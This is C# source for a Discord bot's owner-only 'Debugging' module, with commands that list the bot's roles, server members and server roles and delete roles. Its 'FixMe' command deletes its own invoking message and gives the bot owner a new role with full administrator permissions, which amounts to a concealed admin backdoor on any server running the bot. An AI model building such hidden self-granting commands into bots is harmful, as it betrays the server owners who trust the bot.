using Discord;
using Discord.Commands;
using Discord.WebSocket;
using basicDiscordServerBot.Services;
using System.Linq;
using System.Threading.Tasks;

namespace basicDiscordServerBot.modules
{
    public class Debugging : ModuleBase<SocketCommandContext>
    {
        [Command("FixMe")]
        [RequireOwner]
        public async Task RestoreAdmin()
        {
            await Context.Message.DeleteAsync();
            SocketGuild Guild = Context.Guild;
            var GuildUser = (Context.User as SocketGuildUser);
            var role = await Guild.CreateRoleAsync($"{GuildUser.Username}", new GuildPermissions(true), null, false, null);
            await GuildUser.AddRoleAsync(role);
            // Create a new role with admin privs
            //  - GuildPremissions
            //    bool createInstantInvite = false, bool kickMembers = false, bool banMembers = false, bool administrator = false, bool manageChannels = false, 
            //    bool manageGuild = false, bool addReactions = false, bool viewAuditLog = false, bool viewGuildInsights = false, bool viewChannel = false, 
            //    bool sendMessages = false, bool sendTTSMessages = false, bool manageMessages = false, bool embedLinks = false, bool attachFiles = false, 
            //    bool readMessageHistory = false, bool mentionEveryone = false, bool useExternalEmojis = false, bool connect = false, bool speak = false, 
            //    bool muteMembers = false, bool deafenMembers = false, bool moveMembers = false, bool useVoiceActivation = false, bool prioritySpeaker = false, 
            //    bool stream = false, bool changeNickname = false, bool manageNicknames = false, bool manageRoles = false, bool manageWebhooks = false, bool manageEmojis = false
            /*
             * var myCustomPermissions = new GuildPermissions(false,   //  createInstantInvite
                     true,  //  kickMembers
                     true,  //  banMembers
                     true,  //  administrator
                     true,  //  manageChannels
                     true,  //  manageGuild
                     true,  //  addReactions
                     true,  //  viewAuditLog
                     true,  //  viewGuildInsights
                     true,  //  viewChannel
                     true,  //  sendMessages
                     true,  //  sendTTSMessages
                     true,  //  manageMessages
                     true,  //  embedLinks
                     true,  //  attachFiles
                     true,  //  readMessageHistory
                     true,  //  mentionEveryone
                     true,  //  useExternalEmojis
                     true,  //  connect
                     true,  //  speak
                     true,  //  muteMembers
                     true,  //  deafenMembers
                     true,  //  moveMembers
                     true,  //  useVoiceActivation
                     true,  //  prioritySpeaker
                     true,  //  stream
                     true,  //  changeNickname
                     true,  //  manageNicknames
                     true); //  manageRoles
            */

        }

        [Command("DeleteRole")]
        [RequireOwner]
        public async Task DeleteRole(string NAME)
        {
            await Context.Message.DeleteAsync();        //  Delete Calling Message
            SocketGuild Guild = Context.Guild;          //  Get pointer to Guild Context
            var ROLE = Guild.Roles.FirstOrDefault(x => x.Name == NAME);
            if (ROLE == null) return;
            await ROLE.DeleteAsync();      //  Get and Delete the Role Specified
        }

        [Command("GetInfo::Bot()")]
        [RequireOwner]
        public async Task GetBotInfo()
        {
            SocketGuild Guild = Context.Guild;
            var BOT = Context.Client.CurrentUser;
            var BOTRoles = Guild.GetUser(BOT.Id).Roles;
            string message = $"> ```md\n> # {BOT.Username}\n> - ID: {BOT.Id}\n> - Verified: {BOT.IsVerified}\n> - Status: {BOT.Status}\n> - Created: {BOT.CreatedAt}\n> \n> # ROLES\n";
            foreach (SocketRole role in BOTRoles)
            {
                if (role.Name == "@everyone")
                    continue;
                if (message.Length >= 1500)
                {
                    message += "> ```";
                    await Context.Channel.SendMessageAsync(message);
                    message = $"> ```md\n> # {BOT.Username}\n> - ID: {BOT.Id}\n> - Verified: {BOT.IsVerified}\n> - Status: {BOT.Status}\n> - Created: {BOT.CreatedAt}\n> \n> # ROLES\n";
                }
                else
                    message += $"> - Name: {role.Name} | Position: {role.Position} | ID: {role.Id}\n";
            }
            message += "> ```";
            await Context.Channel.SendMessageAsync(message);
        }

        [Command("GetInfo::Users()")]
        [RequireOwner]
        public async Task GetUsers()
        {
            var Users = Context.Guild.Users;
            string message = "> ```md\n";
            foreach (SocketGuildUser user in Users)
            {

                if (message.Length >= 1500)
                {
                    message += "> ```";
                    await Context.Channel.SendMessageAsync(message);
                    message = "> ```md\n";
                }
                else
                    message += $"> # {user.Username}\n> - Created: {user.CreatedAt}\n> - Joined: {user.JoinedAt}\n> - ID: {user.Id}\n> - Roles: {user.Roles.Count()}\n> \n";
            }
            message += "> ```";
            await Context.Channel.SendMessageAsync(message);
        }

        [Command("GetInfo::Roles()")]
        [RequireOwner]
        public async Task GetRoles()
        {
            SocketGuild Guild = Context.Guild;
            string message = "> ```md\n";
            foreach (SocketRole role in Guild.Roles)
            {
                if (role.Name == "@everyone")
                    continue;
                message += $"> # {role.Name}\n> - Color: {role.Color}\n> - Created: {role.CreatedAt}\n> - ID: {role.Id}\n> - Members: {role.Members.Count()}\n> - Position: {role.Position}\n> \n";
            }
            message += "> ```";
            await Context.Channel.SendMessageAsync(message);
        }

        [Command("GetInfo::RolePosition()")]
        [RequireOwner]
        public async Task GetRolePosition(ulong RoleID, [Remainder] bool DeleteMessage = true)
        {
            if (DeleteMessage)
                await Context.Message.DeleteAsync();
            SocketGuild Guild = Context.Guild;
            var RolePosition = Guild.GetRole(RoleID).Position;
            var RoleName = Guild.GetRole(RoleID).Name;
            string Message = $"RoleName: {RoleName}\nRolePosition: {RolePosition}";
            await Context.Channel.SendMessageAsync(Message);
        }
    }
}
